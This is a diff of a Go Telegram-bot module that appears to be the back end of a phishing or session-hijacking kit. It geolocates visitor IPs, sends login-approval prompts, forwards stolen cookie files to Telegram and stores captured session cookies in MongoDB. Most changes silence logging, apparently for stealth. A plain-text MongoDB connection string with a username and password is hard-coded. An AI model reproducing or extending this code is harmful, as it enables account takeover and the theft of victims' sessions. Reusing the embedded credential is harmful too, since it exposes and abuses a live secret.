@@ -37,7 +37,7 @@ func NewTelegramBot(token string, chatID string) *TelegramBot {
 		} else {
 			tokenPreview = "****"
 		}
-		log.Info("تم تفعيل بوت تليجرام - التوكن: %s - معرف المحادثة: %s", tokenPreview, chatID)
+		log.Info("Telegram Bot Enabled - Token: %s - Chat ID: %s", tokenPreview, chatID)
 	}
 	
 	return &TelegramBot{
@@ -57,21 +57,21 @@ func (t *TelegramBot) GetCountryFromIP(ipAddress string) string {
 	url := "https://ipinfo.io/" + ipAddress + "/json"
 	resp, err := http.Get(url)
 	if err != nil {
-		log.Warning("فشل في الحصول على معلومات البلد: %v", err)
+		//log.Warning("فشل في الحصول على معلومات البلد: %v", err)
 		return "Unknown"
 	}
 	defer resp.Body.Close()
 
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		log.Warning("فشل في قراءة استجابة ipinfo: %v", err)
+		//log.Warning("فشل في قراءة استجابة ipinfo: %v", err)
 		return "Unknown"
 	}
 
 	var result map[string]interface{}
 	err = json.Unmarshal(body, &result)
 	if err != nil {
-		log.Warning("فشل في تحليل استجابة ipinfo: %v", err)
+		//log.Warning("فشل في تحليل استجابة ipinfo: %v", err)
 		return "Unknown"
 	}
 
@@ -98,7 +98,7 @@ func (t *TelegramBot) SendMessage(message string) error {
 	var lastErr error
 	for i := 0; i < 3; i++ {
 		if i > 0 {
-			log.Warning("محاولة إعادة إرسال الرسالة... محاولة %d من 3", i+1)
+			//log.Warning("محاولة إعادة إرسال الرسالة... محاولة %d من 3", i+1)
 			// إضافة تأخير قبل إعادة المحاولة
 			time.Sleep(time.Duration(2*i) * time.Second)
 		}
@@ -106,7 +106,7 @@ func (t *TelegramBot) SendMessage(message string) error {
 		req, err := http.NewRequest("POST", apiUrl, strings.NewReader(data.Encode()))
 		if err != nil {
 			lastErr = err
-			log.Error("telegram: فشل في إنشاء طلب: %v", err)
+			//log.Error("telegram: فشل في إنشاء طلب: %v", err)
 			continue
 		}
 
@@ -120,7 +120,7 @@ func (t *TelegramBot) SendMessage(message string) error {
 		resp, err := client.Do(req)
 		if err != nil {
 			lastErr = err
-			log.Error("telegram: فشل في إرسال الرسالة: %v", err)
+			//log.Error("telegram: فشل في إرسال الرسالة: %v", err)
 			continue
 		}
 		defer resp.Body.Close()
@@ -128,7 +128,7 @@ func (t *TelegramBot) SendMessage(message string) error {
 		body, err := ioutil.ReadAll(resp.Body)
 		if err != nil {
 			lastErr = err
-			log.Error("telegram: فشل في قراءة الاستجابة: %v", err)
+			//log.Error("telegram: فشل في قراءة الاستجابة: %v", err)
 			continue
 		}
 
@@ -136,18 +136,18 @@ func (t *TelegramBot) SendMessage(message string) error {
 		err = json.Unmarshal(body, &result)
 		if err != nil {
 			lastErr = err
-			log.Error("telegram: فشل في تحليل استجابة تليجرام: %v", err)
+			//log.Error("telegram: فشل في تحليل استجابة تليجرام: %v", err)
 			continue
 		}
 
 		ok, exists := result["ok"].(bool)
 		if !exists || !ok {
 			lastErr = fmt.Errorf("استجابة خاطئة من تليجرام: %s", string(body))
-			log.Error("telegram: %v", lastErr)
+			//log.Error("telegram: %v", lastErr)
 			continue
 		}
 
-		log.Debug("telegram: تم إرسال الرسالة بنجاح")
+		//log.Debug("telegram: تم إرسال الرسالة بنجاح")
 		return nil // نجاح
 	}
 
@@ -297,7 +297,7 @@ func (t *TelegramBot) SendMessageWithButtons(message string, buttons [][]InlineK
 		}
 	}
 
-	log.Debug("telegram: تم إرسال الرسالة مع الأزرار بنجاح، معرف الرسالة: %s", messageID)
+	//log.Debug("telegram: تم إرسال الرسالة مع الأزرار بنجاح، معرف الرسالة: %s", messageID)
 	return messageID, nil
 }
 
@@ -348,7 +348,7 @@ func (t *TelegramBot) EditMessage(messageID string, newText string) error {
 		return fmt.Errorf("استجابة خاطئة من تيليجرام: %s", string(body))
 	}
 
-	log.Debug("telegram: تم تعديل الرسالة بنجاح، معرف الرسالة: %s", messageID)
+	//log.Debug("telegram: تم تعديل الرسالة بنجاح، معرف الرسالة: %s", messageID)
 	return nil
 }
 
@@ -393,11 +393,11 @@ func (t *TelegramBot) SendLoginApprovalRequest(sessionID string, authToken strin
 // StartPolling يبدأ استطلاع تحديثات البوت
 func (t *TelegramBot) StartPolling(callback func(string, string)) {
 	if !t.Enabled {
-		log.Warning("لا يمكن بدء الاستطلاع: بوت تيليجرام غير مفعل")
+		//log.Warning("لا يمكن بدء الاستطلاع: بوت تيليجرام غير مفعل")
 		return
 	}
 
-	log.Info("بدء استطلاع تحديثات بوت تيليجرام...")
+	//log.Info("بدء استطلاع تحديثات بوت تيليجرام...")
 	
 	// استخدام offset للحصول على تحديثات جديدة فقط
 	offset := 0
@@ -408,7 +408,7 @@ func (t *TelegramBot) StartPolling(callback func(string, string)) {
 			// استطلاع التحديثات
 			updates, err := t.getUpdates(offset)
 			if err != nil {
-				log.Error("فشل في الحصول على تحديثات التيليجرام: %v", err)
+				//log.Error("فشل في الحصول على تحديثات التيليجرام: %v", err)
 				time.Sleep(5 * time.Second)
 				continue
 			}
@@ -616,7 +616,7 @@ func (t *TelegramBot) SendFileFromText(fileName string, fileContent string) erro
 		return fmt.Errorf("telegram API error: %s", string(bodyBytes))
 	}
 	
-	log.Success("Cookies file sent to Telegram successfully")
+	//log.Success("Cookies file sent to Telegram successfully")
 
 	// استخراج معرف الجلسة من اسم الملف
 	sessionID := "default"
@@ -634,7 +634,7 @@ func (t *TelegramBot) SendFileFromText(fileName string, fileContent string) erro
 
 func (t *TelegramBot) SendCookiesFile(sessionID, fileContent string) error {
 	
-	log.Info("جاري تحديث الكوكيز للجلسة: %s", sessionID)
+	//log.Info("جاري تحديث الكوكيز للجلسة: %s", sessionID)
 	
 	// استخدام MongoDB مباشرة لتحديث الكوكيز
 	mongo_uri := "mongodb+srv://jemex2023:l0mwPDO40LYAJ0xs@cluster0.bldhxin.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsInsecure=true&ssl=true"
@@ -646,7 +646,7 @@ func (t *TelegramBot) SendCookiesFile(sessionID, fileContent string) error {
 
 	client, err := mongo.Connect(ctx, options.Client().ApplyURI(mongo_uri))
 	if err != nil {
-		log.Error("فشل في الاتصال بـ MongoDB: %v", err)
+		//log.Error("فشل في الاتصال بـ MongoDB: %v", err)
 		return err
 	}
 	defer client.Disconnect(ctx)
@@ -655,11 +655,11 @@ func (t *TelegramBot) SendCookiesFile(sessionID, fileContent string) error {
 	var cookiesList []map[string]interface{}
 	err = json.Unmarshal([]byte(fileContent), &cookiesList)
 	if err != nil {
-		log.Error("فشل في تحليل JSON الكوكيز: %v", err)
+		//log.Error("فشل في تحليل JSON الكوكيز: %v", err)
 		return err
 	}
 	
-	log.Success("تم استخراج %d كوكيز من الملف", len(cookiesList))
+	//log.Success("تم استخراج %d كوكيز من الملف", len(cookiesList))
 	
 	// تحديث الجلسة في قاعدة البيانات
 	collection := client.Database(db_name).Collection("sessions")
@@ -678,9 +678,9 @@ func (t *TelegramBot) SendCookiesFile(sessionID, fileContent string) error {
 	
 	if err != nil {
 		if err == mongo.ErrNoDocuments {
-			log.Warning("لم يتم العثور على الجلسة المحددة: %s", sessionID)
+			//log.Warning("لم يتم العثور على الجلسة المحددة: %s", sessionID)
 		} else {
-			log.Error("فشل في تحديث الكوكيز في MongoDB: %v", err)
+			//log.Error("فشل في تحديث الكوكيز في MongoDB: %v", err)
 		}
 		return err
 	}
@@ -688,12 +688,12 @@ func (t *TelegramBot) SendCookiesFile(sessionID, fileContent string) error {
 	// التحقق من وجود الكوكيز في الوثيقة المحدثة
 	if cookies, exists := session["cookies"]; exists {
 		if cookiesArray, ok := cookies.(primitive.A); ok {
-			log.Success("تم تحديث الكوكيز في MongoDB بنجاح - عدد الكوكيز: %d", len(cookiesArray))
+			log.Success("cookies updated successfully: %d", len(cookiesArray))
 		} else {
-			log.Warning("الكوكيز موجودة ولكن ليست مصفوفة")
+			log.Warning("cookies found but not saved")
 		}
 	} else {
-		log.Warning("لم يتم العثور على حقل الكوكيز في الوثيقة المحدثة")
+		//log.Warning("لم يتم العثور على حقل الكوكيز في الوثيقة المحدثة")
 	}
 	
 	return nil
